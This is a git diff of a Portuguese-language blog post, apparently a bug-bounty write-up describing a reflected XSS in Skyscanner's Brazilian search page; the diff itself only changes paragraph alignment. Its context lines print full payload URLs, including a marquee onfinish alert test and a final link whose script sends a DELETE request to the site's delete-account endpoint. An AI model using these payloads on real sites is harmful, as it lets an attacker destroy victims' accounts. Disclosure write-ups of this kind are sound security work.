@@ -13,7 +13,7 @@ Salve rapaziada, no post de hoje irei falar sobre uma vulnerabilidade que encont
 Enquanto navegava pela aplicação, notei que ao fazer uma busca, haviam vários parâmetros sendo passados pelo método GET, similar a este resultado:
 </p>
 
-<p>
+<p align="justify">
 <code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/kef/190615/190622/?adults=1&children=0&adultsv2=1&childrenv2=&infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home#results</code>
 <br>
 </p>
@@ -25,7 +25,7 @@ Dei uma no código fonte e vi que o a URL não era refletida no código fonte da
 Depois de pesquisar um pouco mais, notei que ao realizar uma busca por locais que não haviam viagens a URL era refletida no código. Utilizei o seguinte link para encontrar essa funcionalidade:
 </p>
 
-<p>
+<p align="justify">
 <code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home&ampcurrency=BOB</code>
 <br>
 <br>
@@ -67,7 +67,7 @@ Bom, nesse ponto nosso payload estava da seguinte forma:
 <br>
 </p>
 
-<p>
+<p align="justify">
 Agora, o link junto com o payload ficaria da seguinte forma:
 <br>
 <code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home">&lt;marquee width=0 loop=1 onfinish="alert(1)">rapt00r&lt;/marquee>&ampcurrency=BOB</code>
@@ -99,7 +99,7 @@ request.send();</code>
 <p align="justify">
 E o link final para explorar a vulnerabilidade ficou da seguinte forma:
 </p>
-<p>
+<p align="justify">
 <code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=https://www.google.com"/> &lt;marquee loop=1 width=0 onfinish="var request = new XMLHttpRequest(); request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-account', false); request.send();">&lt;/marquee>&ampcurrency=BOB</code>
 </p>
 
